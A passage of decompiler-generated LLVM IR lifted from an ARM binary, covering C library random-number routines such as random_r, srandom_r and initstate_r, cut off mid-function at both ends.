  %v4_16dfc = mul i32 %v4_16df4, 5
  %v5_16dfc = add i32 %v4_16dfc, %v3_16dd8
  %v3_16e04 = add i32 %v3_16dec, -4
  %v4_16e04 = inttoptr i32 %v3_16e04 to i32*
  store i32 %v5_16dfc, i32* %v4_16e04, align 4
  br label %bb

bb:                                               ; preds = %.thread7, %.thread8
  %v1_16e08 = add i32 %arg1, 4
  store i32 %v1_16e08, i32* %r6.global-to-local, align 4
  %v2_16e0c = inttoptr i32 %arg1 to i32*
  %v3_16e0c = load i32, i32* %v2_16e0c, align 4
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_16e14 = srem i32 %v3_16e0c, 5
  store i32 %v2_16e14, i32* %r0.global-to-local, align 4
  %v2_16e20 = and i32 %v2_16e14, 1073741824
  %v3_16e20 = icmp ne i32 %v2_16e20, 0
  %v4_16e20 = mul nsw i32 %v2_16e14, 4
  %v2_16e24 = icmp ne i32 %v2_16e14, 4
  %v3_16e24 = and i1 %v3_16e20, %v2_16e24
  br i1 %v3_16e24, label %dec_label_pc_16e80, label %dec_label_pc_16e28

dec_label_pc_16e28:                               ; preds = %bb
  %v5_16e20 = add i32 %v4_16e20, ptrtoint (i32* @global_var_22c34.1478 to i32)
  %v1_16e28 = add i32 %v4_16e20, add (i32 ptrtoint (i32* @global_var_22c34.1478 to i32), i32 20)
  %v2_16e28 = inttoptr i32 %v1_16e28 to i32*
  %v3_16e28 = load i32, i32* %v2_16e28, align 4
  store i32 %v3_16e28, i32* %r5.global-to-local, align 4
  %v6_16e2c = inttoptr i32 %v5_16e20 to i32*
  %v7_16e2c = load i32, i32* %v6_16e2c, align 4
  store i32 %v7_16e2c, i32* %r7.global-to-local, align 4
  %v2_16e30 = icmp eq i32 %v2_16e14, 0
  store i32 5, i32* %r1.global-to-local, align 4
  %v1_16e38 = load i32, i32* %r4.global-to-local, align 4
  %v2_16e38 = add i32 %v1_16e38, 16
  %v3_16e38 = inttoptr i32 %v2_16e38 to i32*
  store i32 %v3_16e28, i32* %v3_16e38, align 4
  %v0_16e3c = load i32, i32* %r7.global-to-local, align 4
  %v1_16e3c = load i32, i32* %r4.global-to-local, align 4
  %v2_16e3c = add i32 %v1_16e3c, 20
  %v3_16e3c = inttoptr i32 %v2_16e3c to i32*
  store i32 %v0_16e3c, i32* %v3_16e3c, align 4
  %v0_16e40 = load i32, i32* %r0.global-to-local, align 4
  %v1_16e40 = load i32, i32* %r4.global-to-local, align 4
  %v2_16e40 = add i32 %v1_16e40, 12
  %v3_16e40 = inttoptr i32 %v2_16e40 to i32*
  store i32 %v0_16e40, i32* %v3_16e40, align 4
  br i1 %v2_16e30, label %dec_label_pc_16e6c, label %dec_label_pc_16e48

dec_label_pc_16e48:                               ; preds = %dec_label_pc_16e28
  %v0_16e48 = load i32, i32* %r6.global-to-local, align 4
  %v1_16e48 = add i32 %v0_16e48, -4
  %v2_16e48 = inttoptr i32 %v1_16e48 to i32*
  %v3_16e48 = load i32, i32* %v2_16e48, align 4
  %v1_16e4c = load i32, i32* %r1.global-to-local, align 4
  %v2_16e4c = sdiv i32 %v3_16e48, %v1_16e4c
  store i32 %v2_16e4c, i32* %r0.global-to-local, align 4
  %v4_16e50 = mul i32 %v2_16e4c, 4
  %v5_16e50 = add i32 %v4_16e50, %v0_16e48
  %v1_16e54 = load i32, i32* %r4.global-to-local, align 4
  %v2_16e54 = add i32 %v1_16e54, 4
  %v3_16e54 = inttoptr i32 %v2_16e54 to i32*
  store i32 %v5_16e50, i32* %v3_16e54, align 4
  %v0_16e58 = load i32, i32* %r0.global-to-local, align 4
  %v1_16e58 = load i32, i32* %r7.global-to-local, align 4
  %v2_16e58 = add i32 %v1_16e58, %v0_16e58
  %v0_16e5c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_16e5c, i32* %r1.global-to-local, align 4
  %v2_16e60 = srem i32 %v2_16e58, %v0_16e5c
  %v0_16e64 = load i32, i32* %r6.global-to-local, align 4
  %v4_16e64 = mul i32 %v2_16e60, 4
  %v5_16e64 = add i32 %v0_16e64, %v4_16e64
  store i32 %v5_16e64, i32* %r0.global-to-local, align 4
  %v1_16e68 = load i32, i32* %r4.global-to-local, align 4
  %v2_16e68 = inttoptr i32 %v1_16e68 to i32*
  store i32 %v5_16e64, i32* %v2_16e68, align 4
  br label %dec_label_pc_16e6c

dec_label_pc_16e6c:                               ; preds = %dec_label_pc_16e28, %dec_label_pc_16e48
  %v0_16e6c = load i32, i32* %r6.global-to-local, align 4
  %v1_16e6c = load i32, i32* %r5.global-to-local, align 4
  %v4_16e6c = mul i32 %v1_16e6c, 4
  %v5_16e6c = add i32 %v4_16e6c, %v0_16e6c
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_16e74 = load i32, i32* %r4.global-to-local, align 4
  %v2_16e74 = add i32 %v1_16e74, 24
  %v3_16e74 = inttoptr i32 %v2_16e74 to i32*
  store i32 %v5_16e6c, i32* %v3_16e74, align 4
  %v0_16e78 = load i32, i32* %r6.global-to-local, align 4
  %v1_16e78 = load i32, i32* %r4.global-to-local, align 4
  %v2_16e78 = add i32 %v1_16e78, 8
  %v3_16e78 = inttoptr i32 %v2_16e78 to i32*
  store i32 %v0_16e78, i32* %v3_16e78, align 4
  %v2_16e7c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_16e7c, i32* %r4.global-to-local, align 4
  ret i32 0

dec_label_pc_16e80:                               ; preds = %bb
  %v0_16e80 = call i32 @__errno_location()
  %v2_16e88 = inttoptr i32 %v0_16e80 to i32*
  store i32 22, i32* %v2_16e88, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_16e90 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_16e90, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v2_16e14, { 1, 0, 3, 2, 4 }
  uselistorder i32 %tmp, { 1, 4, 0, 3, 2, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 1, 2, 3, 4, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16e6c, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v1_16e98 = add i32 %tmp, 12
  %v2_16e98 = inttoptr i32 %v1_16e98 to i32*
  %v3_16e98 = load i32, i32* %v2_16e98, align 4
  store i32 %v3_16e98, i32* %r3.global-to-local, align 4
  %v2_16e9c = icmp eq i32 %v3_16e98, 0
  %v3_16ea0 = load i32, i32* @r4, align 4
  store i32 %v3_16ea0, i32* %stack_var_-12, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_16eac = add i32 %tmp, 8
  %v2_16eac = inttoptr i32 %v1_16eac to i32*
  %v3_16eac = load i32, i32* %v2_16eac, align 4
  store i32 %v3_16eac, i32* %lr.global-to-local, align 4
  br i1 %v2_16e9c, label %dec_label_pc_16eb4, label %dec_label_pc_16ed8

dec_label_pc_16eb4:                               ; preds = %entry
  %v1_16eb4 = inttoptr i32 %v3_16eac to i32*
  %v2_16eb4 = load i32, i32* %v1_16eb4, align 4
  store i32 %v2_16eb4, i32* %r2.global-to-local, align 4
  %v2_16ebc = mul i32 %v2_16eb4, 1103515245
  %v1_16ec4 = add i32 %v2_16ebc, 12345
  %tmp10 = bitcast i32 %v1_16ec4 to float
  %tmp11 = call float @fabsf(float %tmp10)
  %v1_16ec8 = bitcast float %tmp11 to i32
  store i32 %v1_16ec8, i32* %r3.global-to-local, align 4
  store i32 %v1_16ec8, i32* %v1_16eb4, align 4
  %v0_16ed0 = load i32, i32* %r3.global-to-local, align 4
  %v2_16ed0 = inttoptr i32 %arg2 to i32*
  store i32 %v0_16ed0, i32* %v2_16ed0, align 4
  br label %dec_label_pc_16f1c

dec_label_pc_16ed8:                               ; preds = %entry
  %v2_16ed8 = load i32, i32* %arg1, align 4
  store i32 %v2_16ed8, i32* %r2.global-to-local, align 4
  %v1_16edc = add i32 %tmp, 4
  %v2_16edc = inttoptr i32 %v1_16edc to i32*
  %v3_16edc = load i32, i32* %v2_16edc, align 4
  store i32 %v3_16edc, i32* %r0.global-to-local, align 4
  %v1_16ee0 = inttoptr i32 %v2_16ed8 to i32*
  %v2_16ee0 = load i32, i32* %v1_16ee0, align 4
  store i32 %v2_16ee0, i32* %r3.global-to-local, align 4
  %v1_16ee4 = inttoptr i32 %v3_16edc to i32*
  %v2_16ee4 = load i32, i32* %v1_16ee4, align 4
  %v4_16ee4 = add i32 %v3_16edc, 4
  store i32 %v4_16ee4, i32* %r0.global-to-local, align 4
  %v2_16ee8 = add i32 %v2_16ee4, %v2_16ee0
  store i32 %v2_16ee8, i32* %r3.global-to-local, align 4
  store i32 %v2_16ee8, i32* %v1_16ee0, align 4
  %v3_16eec = load i32, i32* %r2.global-to-local, align 4
  %v4_16eec = add i32 %v3_16eec, 4
  store i32 %v4_16eec, i32* %r2.global-to-local, align 4
  %v0_16ef0 = load i32, i32* %ip.global-to-local, align 4
  %v1_16ef0 = add i32 %v0_16ef0, 24
  %v2_16ef0 = inttoptr i32 %v1_16ef0 to i32*
  %v3_16ef0 = load i32, i32* %v2_16ef0, align 4
  store i32 %v3_16ef0, i32* %r4.global-to-local, align 4
  %v0_16ef4 = load i32, i32* %r3.global-to-local, align 4
  %v3_16ef4 = udiv i32 %v0_16ef4, 2
  store i32 %v3_16ef4, i32* %r3.global-to-local, align 4
  %v3_16ef8 = icmp ult i32 %v4_16eec, %v3_16ef0
  %v1_16efc = load i32, i32* %r5.global-to-local, align 4
  %v2_16efc = inttoptr i32 %v1_16efc to i32*
  store i32 %v3_16ef4, i32* %v2_16efc, align 4
  br i1 %v3_16ef8, label %dec_label_pc_16f0c, label %bb

bb:                                               ; preds = %dec_label_pc_16ed8
  %v1_16f00 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_16f00, i32* %r2.global-to-local, align 4
  %v0_16f04 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16f04, i32* %r3.global-to-local, align 4
  br label %bb9

dec_label_pc_16f0c:                               ; preds = %dec_label_pc_16ed8
  %v0_16f041 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16f041, i32* %r3.global-to-local, align 4
  %v1_16f0c = load i32, i32* %r4.global-to-local, align 4
  %v3_16f0c = icmp ult i32 %v0_16f041, %v1_16f0c
  br i1 %v3_16f0c, label %bb8, label %.thread2

bb8:                                              ; preds = %dec_label_pc_16f0c
  store i32 %v0_16f041, i32* %r3.global-to-local, align 4
  br label %bb9

.thread2:                                         ; preds = %dec_label_pc_16f0c
  %v1_16f14 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_16f14, i32* %r3.global-to-local, align 4
  br label %bb9

bb9:                                              ; preds = %bb, %bb8, %.thread2
  %v0_16f18 = load i32, i32* %ip.global-to-local, align 4
  %v1_16f18 = inttoptr i32 %v0_16f18 to i32*
  %v2_16f18 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_16f18, i32* %v1_16f18, align 4
  %v3_16f18 = add i32 %v0_16f18, 4
  %v4_16f18 = inttoptr i32 %v3_16f18 to i32*
  %v5_16f18 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_16f18, i32* %v4_16f18, align 4
  br label %dec_label_pc_16f1c

dec_label_pc_16f1c:                               ; preds = %dec_label_pc_16eb4, %bb9
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_16f20 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16f20, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_16f041, { 1, 0, 2 }
  uselistorder i32 %v3_16ef4, { 1, 0 }
  uselistorder i32 %v1_16ec8, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 0, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder label %dec_label_pc_16f1c, { 1, 0 }
  uselistorder label %bb9, { 2, 1, 0 }
}

define i32 @srandom_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_16f28 = load i32, i32* @r4, align 4
  store i32 %v3_16f28, i32* %stack_var_-32, align 4
  %v6_16f28 = load i32, i32* @r5, align 4
  %v1_16f2c = add i32 %tmp, 12
  %v2_16f2c = inttoptr i32 %v1_16f2c to i32*
  %v3_16f2c = load i32, i32* %v2_16f2c, align 4
  %v2_16f34 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %tmp29 = icmp ugt i32 %v3_16f2c, 4
  br i1 %tmp29, label %.dec_label_pc_16fe0_crit_edge, label %dec_label_pc_16f44

.dec_label_pc_16fe0_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_16fe0

dec_label_pc_16f44:                               ; preds = %entry
  %v0_16f44 = load i32, i32* @r0, align 4
  %v2_16f44 = icmp eq i32 %v0_16f44, 0
  %v1_16f48 = add i32 %tmp, 8
  %v2_16f48 = inttoptr i32 %v1_16f48 to i32*
  %v3_16f48 = load i32, i32* %v2_16f48, align 4
  store i32 %v3_16f48, i32* %r7.global-to-local, align 4
  br i1 %v2_16f44, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_16f44
  store i32 1, i32* @r0, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_16f44, %bb
  %v0_16f54 = phi i32 [ %v0_16f44, %dec_label_pc_16f44 ], [ 1, %bb ]
  %v2_16f50 = icmp eq i32 %v3_16f2c, 0
  %v2_16f54 = inttoptr i32 %v3_16f48 to i32*
  store i32 %v0_16f54, i32* %v2_16f54, align 4
  br i1 %v2_16f50, label %dec_label_pc_16fdc, label %dec_label_pc_16f5c

dec_label_pc_16f5c:                               ; preds = %bb21
  %v1_16f5c = add i32 %tmp, 16
  %v2_16f5c = inttoptr i32 %v1_16f5c to i32*
  %v3_16f5c = load i32, i32* %v2_16f5c, align 4
  store i32 %v3_16f5c, i32* %sb.global-to-local, align 4
  %v0_16f60 = load i32, i32* @r0, align 4
  %v0_16f64 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16f64, i32* %sl.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  %v5_16fac23 = icmp sgt i32 %v3_16f5c, 1
  br i1 %v5_16fac23, label %dec_label_pc_16f70, label %dec_label_pc_16fb0

dec_label_pc_16f70:                               ; preds = %dec_label_pc_16f5c, %dec_label_pc_16f70
  %v0_16f8025 = phi i32 [ %v0_16fa0.pre, %dec_label_pc_16f70 ], [ %v0_16f60, %dec_label_pc_16f5c ]
  %v1_16f9824 = phi i32 [ %v5_16f98, %dec_label_pc_16f70 ], [ %v0_16f64, %dec_label_pc_16f5c ]
  %v2_16f70 = srem i32 %v0_16f8025, ptrtoint ([10 x i8]* @global_var_1f31d.1482 to i32)
  %v2_16f7c = mul i32 %v2_16f70, 16807
  %v2_16f84 = sdiv i32 %v0_16f8025, ptrtoint ([10 x i8]* @global_var_1f31d.1482 to i32)
  %tmp30 = mul i32 %v2_16f84, -2836
  %v2_16f90 = add i32 %v2_16f7c, %tmp30
  %v8_16f90 = icmp slt i32 %v2_16f90, 0
  %v2_16f94 = add i32 %v2_16f90, 2147483647
  %v2_16f94.v2_16f90 = select i1 %v8_16f90, i32 %v2_16f94, i32 %v2_16f90
  store i32 %v2_16f94.v2_16f90, i32* @r5, align 4
  %v2_16f98 = add i32 %v1_16f9824, 4
  %v3_16f98 = inttoptr i32 %v2_16f98 to i32*
  store i32 %v2_16f94.v2_16f90, i32* %v3_16f98, align 4
  %v4_16f98 = load i32, i32* %sl.global-to-local, align 4
  %v5_16f98 = add i32 %v4_16f98, 4
  store i32 %v5_16f98, i32* %sl.global-to-local, align 4
  %v0_16f9c.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_16f9c.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_16fa0.pre = load i32, i32* @r5, align 4
  %v1_16fa8 = add i32 %v0_16f9c.pre, 1
  store i32 %v1_16fa8, i32* %r8.global-to-local, align 4
  %v5_16fac = icmp slt i32 %v0_16f9c.pre, %v1_16f9c.pre
  br i1 %v5_16fac, label %dec_label_pc_16f70, label %dec_label_pc_16f9c.dec_label_pc_16fb0_crit_edge

dec_label_pc_16f9c.dec_label_pc_16fb0_crit_edge:  ; preds = %dec_label_pc_16f70
  %v0_16fbc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16fb0

dec_label_pc_16fb0:                               ; preds = %dec_label_pc_16f9c.dec_label_pc_16fb0_crit_edge, %dec_label_pc_16f5c
  %v0_16fbc = phi i32 [ %v0_16fbc.pre, %dec_label_pc_16f9c.dec_label_pc_16fb0_crit_edge ], [ %v0_16f64, %dec_label_pc_16f5c ]
  %v0_16fb4.lcssa = phi i32 [ %v1_16f9c.pre, %dec_label_pc_16f9c.dec_label_pc_16fb0_crit_edge ], [ %v3_16f5c, %dec_label_pc_16f5c ]
  %v2_16fb4 = mul i32 %v0_16fb4.lcssa, 10
  store i32 %v2_16fb4, i32* @r4, align 4
  %v0_16fb8 = load i32, i32* %r6.global-to-local, align 4
  %v1_16fb8 = add i32 %v0_16fb8, 20
  %v2_16fb8 = inttoptr i32 %v1_16fb8 to i32*
  %v3_16fb8 = load i32, i32* %v2_16fb8, align 4
  %v4_16fbc = mul i32 %v3_16fb8, 4
  %v5_16fbc = add i32 %v0_16fbc, %v4_16fbc
  %v1_16fc0 = inttoptr i32 %v0_16fb8 to i32*
  store i32 %v5_16fbc, i32* %v1_16fc0, align 4
  %v3_16fc0 = add i32 %v0_16fb8, 4
  %v4_16fc0 = inttoptr i32 %v3_16fc0 to i32*
  %v5_16fc0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_16fc0, i32* %v4_16fc0, align 4
  br label %dec_label_pc_16fcc

dec_label_pc_16fc8:                               ; preds = %dec_label_pc_16fcc
  %v0_16fd0 = load i32, i32* %r6.global-to-local, align 4
  %v2_16fc8 = inttoptr i32 %v0_16fd0 to i32*
  %v3_16fc8 = call i32 @__GI_random_r(i32* %v2_16fc8, i32 %v2_16f34)
  br label %dec_label_pc_16fcc

dec_label_pc_16fcc:                               ; preds = %dec_label_pc_16fb0, %dec_label_pc_16fc8
  %v0_16fcc = load i32, i32* @r4, align 4
  %v1_16fcc = add i32 %v0_16fcc, -1
  store i32 %v1_16fcc, i32* @r4, align 4
  %v6_16fcc = icmp slt i32 %v1_16fcc, 0
  br i1 %v6_16fcc, label %dec_label_pc_16fdc, label %dec_label_pc_16fc8

dec_label_pc_16fdc:                               ; preds = %dec_label_pc_16fcc, %bb21
  %v2_16fe4.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_16fe0

dec_label_pc_16fe0:                               ; preds = %.dec_label_pc_16fe0_crit_edge, %dec_label_pc_16fdc
  %v2_16fe4 = phi i32 [ %v3_16f28, %.dec_label_pc_16fe0_crit_edge ], [ %v2_16fe4.pre, %dec_label_pc_16fdc ]
  %v26_16fe4 = phi i32 [ -1, %.dec_label_pc_16fe0_crit_edge ], [ 0, %dec_label_pc_16fdc ]
  store i32 %v2_16fe4, i32* @r4, align 4
  store i32 %v6_16f28, i32* @r5, align 4
  ret i32 %v26_16fe4

; uselistorder directives
  uselistorder i32 %v1_16fcc, { 1, 0 }
  uselistorder i32 %v0_16fb8, { 1, 0, 2 }
  uselistorder i32 %v0_16f9c.pre, { 1, 0 }
  uselistorder i32 %v5_16f98, { 1, 0 }
  uselistorder i32 %v2_16f90, { 2, 1, 0 }
  uselistorder i32 %v0_16f8025, { 1, 0 }
  uselistorder i32 %v0_16f64, { 1, 0, 2 }
  uselistorder i32 %v3_16f5c, { 1, 0, 2 }
  uselistorder i32 %v3_16f2c, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([10 x i8]* @global_var_1f31d.1482 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_16fe0, { 1, 0 }
  uselistorder label %dec_label_pc_16fcc, { 1, 0 }
  uselistorder label %dec_label_pc_16f70, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @"$d.3"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_16fe8:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_16fe8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16fe8, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_16fe8
  %v2_16fe8 = load i32, i32* @r7, align 4
  %v5_16fe8 = udiv i32 %v2_16fe8, 8
  %v6_16fe8 = and i32 %v5_16fe8, %arg1
  store i32 %v6_16fe8, i32* %r4.global-to-local, align 4
  %v2_16fec = load i32, i32* @sp, align 4
  %v8_16fec = shl i32 %v2_16fec, %arg3
  %v9_16fec = and i32 %v8_16fec, %arg2
  call void @__pseudo_branch(i32 %v9_16fec)
  %v0_16ff0.pr.pr = load i1, i1* @cpsr_z, align 1
  %v1_16ff0 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_16ff0.pr.pr, label %bb, label %.thread1

bb:                                               ; preds = %.thread
  %v2_16ff0 = load i32, i32* %r4.global-to-local, align 4
  %v3_16ff0 = load i32, i32* @fp, align 4
  %v8_16ff0 = shl i32 %v2_16ff0, %v3_16ff0
  %v9_16ff0 = and i32 %v8_16ff0, %v1_16ff0
  store i32 %v9_16ff0, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread, %dec_label_pc_16fe8, %bb
  %v10_16ff0 = phi i32 [ %arg1, %dec_label_pc_16fe8 ], [ %v9_16ff0, %bb ], [ %v1_16ff0, %.thread ]
  ret i32 %v10_16ff0

; uselistorder directives
  uselistorder i32 %v1_16ff0, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread1, { 2, 0, 1 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_16ff8 = load i32, i32* @r4, align 4
  store i32 %v3_16ff8, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg2, 128
  br i1 %tmp28, label %dec_label_pc_17018, label %dec_label_pc_17008

dec_label_pc_17008:                               ; preds = %entry
  %v2_17008 = icmp ugt i32 %arg2, 254
  %v7_17008 = icmp eq i32 %arg2, 255
  %v2_1700c = xor i1 %v7_17008, true
  %v3_1700c = and i1 %v2_17008, %v2_1700c
  br i1 %v3_1700c, label %bb, label %bb20

bb:                                               ; preds = %dec_label_pc_17008
  store i32 4, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_17008, %bb
  %v1_170407 = phi i32 [ %v3_16ff8, %dec_label_pc_17008 ], [ 4, %bb ]
  %v2_17010 = xor i1 %v2_17008, true
  %v3_17010 = or i1 %v7_17008, %v2_17010
  br i1 %v3_17010, label %bb21, label %bb25

bb21:                                             ; preds = %bb20
  store i32 3, i32* @r4, align 4
  br label %bb25

dec_label_pc_17018:                               ; preds = %entry
  %tmp29 = icmp ugt i32 %arg2, 31
  br i1 %tmp29, label %dec_label_pc_17030, label %dec_label_pc_17020

dec_label_pc_17020:                               ; preds = %dec_label_pc_17018
  %tmp30 = icmp ugt i32 %arg2, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_1709c

.thread10:                                        ; preds = %dec_label_pc_17020
  store i32 0, i32* @r4, align 4
  br label %bb25

dec_label_pc_17030:                               ; preds = %dec_label_pc_17018
  %v2_17030 = icmp ugt i32 %arg2, 62
  %v7_17030 = icmp eq i32 %arg2, 63
  %v2_17034 = xor i1 %v7_17030, true
  %v3_17034 = and i1 %v2_17030, %v2_17034
  br i1 %v3_17034, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_17030
  store i32 2, i32* @r4, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_17030, %bb22
  %v1_170406 = phi i32 [ %v3_16ff8, %dec_label_pc_17030 ], [ 2, %bb22 ]
  %v2_17038 = xor i1 %v2_17030, true
  %v3_17038 = or i1 %v7_17030, %v2_17038
  br i1 %v3_17038, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  store i32 1, i32* @r4, align 4
  br label %bb25

bb25:                                             ; preds = %.thread10, %bb21, %bb20, %bb23, %bb24
  %v1_17048 = phi i32 [ 3, %bb21 ], [ %v1_170407, %bb20 ], [ %v1_170406, %bb23 ], [ 1, %bb24 ], [ 0, %.thread10 ]
  store i32 ptrtoint (i32* @global_var_22c34.1478 to i32), i32* %r2.global-to-local, align 4
  %v4_17040 = mul i32 %v1_17048, 4
  %v5_17040 = add i32 %v4_17040, ptrtoint (i32* @global_var_22c34.1478 to i32)
  store i32 %v5_17040, i32* %r3.global-to-local, align 4
  %v1_17044 = add i32 %v4_17040, add (i32 ptrtoint (i32* @global_var_22c34.1478 to i32), i32 20)
  %v2_17044 = inttoptr i32 %v1_17044 to i32*
  %v3_17044 = load i32, i32* %v2_17044, align 4
  store i32 %v3_17044, i32* %r1.global-to-local, align 4
  %v6_17048 = inttoptr i32 %v5_17040 to i32*
  %v7_17048 = load i32, i32* %v6_17048, align 4
  store i32 %v7_17048, i32* %r2.global-to-local, align 4
  %v1_1704c = add i32 %tmp, 4
  store i32 %v1_1704c, i32* @r6, align 4
  %v4_17050 = mul i32 %v3_17044, 4
  %v5_17050 = add i32 %v4_17050, %v1_1704c
  store i32 %v5_17050, i32* %r3.global-to-local, align 4
  %v2_17054 = add i32 %arg3, 24
  %v3_17054 = inttoptr i32 %v2_17054 to i32*
  store i32 %v5_17050, i32* %v3_17054, align 4
  %v0_17058 = load i32, i32* %r2.global-to-local, align 4
  %v1_17058 = load i32, i32* @r5, align 4
  %v2_17058 = add i32 %v1_17058, 20
  %v3_17058 = inttoptr i32 %v2_17058 to i32*
  store i32 %v0_17058, i32* %v3_17058, align 4
  %v0_1705c = load i32, i32* %r1.global-to-local, align 4
  %v1_1705c = load i32, i32* @r5, align 4
  %v2_1705c = add i32 %v1_1705c, 16
  %v3_1705c = inttoptr i32 %v2_1705c to i32*
  store i32 %v0_1705c, i32* %v3_1705c, align 4
  %v0_17060 = load i32, i32* @r4, align 4
  %v1_17060 = load i32, i32* @r5, align 4
  %v2_17060 = add i32 %v1_17060, 12
  %v3_17060 = inttoptr i32 %v2_17060 to i32*
  store i32 %v0_17060, i32* %v3_17060, align 4
  %v0_17064 = load i32, i32* @r6, align 4
  %v1_17064 = load i32, i32* @r5, align 4
  %v2_17064 = add i32 %v1_17064, 8
  %v3_17064 = inttoptr i32 %v2_17064 to i32*
  store i32 %v0_17064, i32* %v3_17064, align 4
  %v0_17068 = load i32, i32* @r5, align 4
  store i32 %v0_17068, i32* %r1.global-to-local, align 4
  %v0_1706c = load i32, i32* @r0, align 4
  %v2_1706c = inttoptr i32 %v0_1706c to i32*
  %v3_1706c = call i32 @srandom_r(i32* %v2_1706c, i32 %v0_17068)
  store i32 %v3_1706c, i32* %r0.global-to-local, align 4
  %v0_17070 = load i32, i32* @r4, align 4
  %v2_17070 = icmp eq i32 %v0_17070, 0
  br i1 %v2_17070, label %bb26, label %.thread4

bb26:                                             ; preds = %bb25
  %v1_1708c12 = load i32, i32* @r7, align 4
  %v2_1708c13 = inttoptr i32 %v1_1708c12 to i32*
  store i32 0, i32* %v2_1708c13, align 4
  %v1_17090 = load i32, i32* @r4, align 4
  store i32 %v1_17090, i32* %r0.global-to-local, align 4
  br label %bb27

.thread4:                                         ; preds = %bb25
  %v1_17074 = load i32, i32* @r5, align 4
  %v2_17074 = add i32 %v1_17074, 4
  %v3_17074 = inttoptr i32 %v2_17074 to i32*
  %v4_17074 = load i32, i32* %v3_17074, align 4
  %v1_17078 = load i32, i32* @r6, align 4
  %v3_17078 = sub i32 %v4_17074, %v1_17078
